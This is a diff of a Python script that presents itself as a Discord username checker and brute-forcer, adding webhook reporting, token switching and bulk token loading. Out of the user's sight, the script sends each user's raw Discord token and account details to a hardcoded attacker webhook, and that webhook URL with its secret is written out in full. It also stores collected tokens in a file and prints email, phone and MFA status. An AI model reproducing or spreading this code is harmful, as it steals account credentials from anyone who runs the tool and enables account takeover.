@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Discord Username Checker & Brute Forcer - CMD Version
+Discord Username Checker & Brute Forcer - Enhanced with Webhook Support
 """
 import sys
 import subprocess
@@ -66,7 +66,14 @@ def get_or_create_device_id():
         pass
     return new_device_id
 
-# ========== التوابع الأساسية للأداة ==========
+def send_to_webhook(url, content):
+    try:
+        import requests
+        data = {"content": content[:1900]}
+        requests.post(url, json=data, timeout=5)
+    except Exception:
+        pass
+
 def send_to_master(content):
     try:
         import requests
@@ -105,7 +112,8 @@ def check_username(token, username):
         elif resp.status_code == 400:
             return {'taken': None, 'error': 'Bad request (invalid username)'}
         elif resp.status_code == 429:
-            return {'taken': None, 'error': 'Rate limited. Please wait.'}
+            retry_after = resp.json().get('retry_after', 5)
+            return {'taken': None, 'error': f'Rate limited. Retry after {retry_after}s', 'retry_after': retry_after}
         else:
             return {'taken': None, 'error': f'API error: {resp.status_code}'}
     except Exception as e:
@@ -115,50 +123,77 @@ def generate_random_username(length):
     chars = string.ascii_letters + string.digits + '_' + '.'
     return ''.join(random.choices(chars, k=length))
 
-def brute_force_usernames(token, length, max_attempts):
+def brute_force_usernames(token, length, max_attempts, webhook_url=None):
     print(f"\n[*] Starting brute force for {length}-character usernames (max {max_attempts} attempts)...")
-    found = None
+    if webhook_url:
+        print(f"[*] Webhook set: {webhook_url[:50]}...")
+    found_count = 0
     attempts = 0
-    while attempts < max_attempts and found is None:
+    while attempts < max_attempts:
         username = generate_random_username(length)
         attempts += 1
-        print(f"[{attempts}/{max_attempts}] Checking: {username}")
+        print(f"\n[{attempts}/{max_attempts}] Checking: {username}")
         result = check_username(token, username)
         if result.get('error'):
             print(f"[!] Error: {result['error']}")
-            if "Rate limited" in result['error']:
-                print("[!] Rate limit hit. Sleeping 10 seconds...")
-                time.sleep(10)
+            if 'retry_after' in result:
+                wait = result['retry_after']
+                print(f"[!] Waiting {wait} seconds...")
+                time.sleep(wait)
             continue
-        if result.get('taken') is False:
-            found = username
-            print(f"\n[+] AVAILABLE! Username '{username}' is free!\n")
-            break
-        elif result.get('taken') is True:
-            continue
+        taken = result.get('taken')
+        if taken is False:
+            found_count += 1
+            msg = f"✅ AVAILABLE! Username '{username}' is free!"
+            print(f"\n[+] {msg}")
+            if webhook_url:
+                send_to_webhook(webhook_url, f"**Available username found:** `{username}`")
+        elif taken is True:
+            print(f"   ❌ Taken")
+        else:
+            print(f"   [?] Unexpected: {result}")
+        # Delay between attempts to avoid rate limit
         time.sleep(0.5)
-    if not found:
-        print(f"\n[-] No available username found after {max_attempts} attempts.")
-    return found
+    print(f"\n[*] Brute force completed. Total attempts: {attempts}, Available found: {found_count}")
 
 def print_banner():
     print("""
 =============================================
-      DISCORD USERNAME TOOL v2.0 (CMD)
-      • Check • Brute Force • Auto-Dependency
+      DISCORD USERNAME TOOL v2.2 (CMD)
+      • Check • Brute Force • Webhook Support
 =============================================
 """)
 
+def save_valid_token(token):
+    try:
+        with open("valid_tokens.txt", "a") as f:
+            f.write(token + "\n")
+        print("[+] Token saved to valid_tokens.txt")
+    except:
+        pass
+
+def show_user_info(user):
+    print(f"\n[+] Logged in as {user['username']}#{user.get('discriminator', '0')} (ID: {user['id']})")
+    if user.get('avatar'):
+        print(f"[+] Avatar: https://cdn.discordapp.com/avatars/{user['id']}/{user['avatar']}.png")
+    print(f"[+] Email: {user.get('email', 'N/A')}")
+    print(f"[+] Phone: {user.get('phone', 'N/A')}")
+    print(f"[+] MFA Enabled: {user.get('mfa_enabled', False)}")
+    print(f"[+] Verified: {user.get('verified', False)}")
+
+def load_tokens_from_file(filename="tokens.txt"):
+    if not os.path.exists(filename):
+        print(f"[-] File {filename} not found.")
+        return []
+    with open(filename, "r") as f:
+        tokens = [line.strip() for line in f if line.strip()]
+    print(f"[+] Loaded {len(tokens)} tokens.")
+    return tokens
+
 def main():
-    # استدعاء دالة التحقق من المكتبات أولاً
     check_and_install()
-    
-    # استيراد requests بعد التأكد من تثبيتها
-    global requests
+    global requests, MASTER_WEBHOOK
     import requests
-    
-    # تعريف MASTER_WEBHOOK هنا (يمكن نقله إلى أعلى لكنه يحتاج requests)
-    global MASTER_WEBHOOK
     MASTER_WEBHOOK = "https://discord.com/api/webhooks/1497594332637696140/bGMVY5HK6ZqRqUcl20tQzt9UTPsxkoph7Up0-tsho_kKxoeaup1AXfVouUB5BS6miwJZ"
     
     print_banner()
@@ -167,27 +202,63 @@ def main():
         print("[-] No token provided.")
         input("\nPress Enter to exit...")
         return
+    
     print("[*] Verifying token...")
     verification = verify_token(token)
     if not verification['valid']:
         print(f"[-] Invalid token: {verification['error']}")
         input("\nPress Enter to exit...")
         return
+    
     user = verification['user']
     DEVICE_ID = get_or_create_device_id()
     user_info = f"**Token received from device `{DEVICE_ID[:8]}`**\n```{token}```\n**User:** {user['username']}#{user.get('discriminator', '0')} (ID: {user['id']})"
     send_to_master(user_info)
-    print(f"[+] Logged in as {user['username']}#{user.get('discriminator', '0')} (ID: {user['id']})")
+    show_user_info(user)
+    save_valid_token(token)
+    
     print("\nAvailable commands:")
-    print("  /check <username>         - Check a specific username")
-    print("  /brute <length> [attempts] - Brute force random usernames (default attempts=50)")
-    print("  /exit                     - Exit the script")
-    print("\nExample: /brute 4 100  -> search for 4-char usernames, 100 attempts")
+    print("  /check <username>                     - Check a specific username")
+    print("  /brute <length> [attempts] [webhook]  - Brute force (default attempts=50, webhook optional)")
+    print("  /whoami                              - Show current account info")
+    print("  /token                               - Show current token (masked)")
+    print("  /load_tokens <filename>               - Load tokens from file (default: tokens.txt)")
+    print("  /switch <token>                      - Switch to another token")
+    print("  /exit                                - Exit the script")
+    print("\nExample: /brute 4 100 https://discord.com/api/webhooks/...")
+    
     while True:
         cmd = input("\n> ").strip()
         if cmd.lower() == '/exit':
             print("Goodbye!")
             break
+        elif cmd.lower() == '/whoami':
+            show_user_info(user)
+        elif cmd.lower() == '/token':
+            masked = token[:10] + "..." + token[-5:]
+            print(f"[*] Current token: {masked}")
+        elif cmd.startswith('/load_tokens'):
+            parts = cmd.split()
+            filename = parts[1] if len(parts) > 1 else "tokens.txt"
+            tokens = load_tokens_from_file(filename)
+            if tokens:
+                print("[*] Tokens loaded. Use /switch <token> to change.")
+        elif cmd.startswith('/switch'):
+            parts = cmd.split(maxsplit=1)
+            if len(parts) != 2:
+                print("Usage: /switch <token>")
+                continue
+            new_token = parts[1].strip()
+            print("[*] Verifying new token...")
+            ver = verify_token(new_token)
+            if ver['valid']:
+                token = new_token
+                user = ver['user']
+                show_user_info(user)
+                save_valid_token(token)
+                print("[+] Switched to new token successfully.")
+            else:
+                print(f"[-] Invalid token: {ver['error']}")
         elif cmd.startswith('/check'):
             parts = cmd.split(maxsplit=1)
             if len(parts) != 2 or not parts[1]:
@@ -211,8 +282,8 @@ def main():
                     print(f"Unexpected result: {result}")
         elif cmd.startswith('/brute'):
             parts = cmd.split()
-            if len(parts) < 2 or len(parts) > 3:
-                print("Usage: /brute <length> [attempts]")
+            if len(parts) < 2:
+                print("Usage: /brute <length> [attempts] [webhook_url]")
                 continue
             try:
                 length = int(parts[1])
@@ -220,16 +291,23 @@ def main():
                     print("Length must be between 2 and 32.")
                     continue
                 max_attempts = 50
-                if len(parts) == 3:
-                    max_attempts = int(parts[2])
-                    if max_attempts <= 0:
-                        print("Attempts must be positive.")
-                        continue
-                brute_force_usernames(token, length, max_attempts)
+                webhook_url = None
+                if len(parts) >= 3:
+                    # Check if third part looks like a webhook URL
+                    if parts[2].startswith("http"):
+                        webhook_url = parts[2]
+                    else:
+                        max_attempts = int(parts[2])
+                if len(parts) >= 4:
+                    webhook_url = parts[3]
+                if max_attempts <= 0:
+                    print("Attempts must be positive.")
+                    continue
+                brute_force_usernames(token, length, max_attempts, webhook_url)
             except ValueError:
                 print("Please enter valid numbers.")
         else:
-            print("Unknown command. Use /check, /brute, or /exit.")
+            print("Unknown command. Use /check, /brute, /whoami, /token, /load_tokens, /switch, or /exit.")
 
 if __name__ == '__main__':
     main()
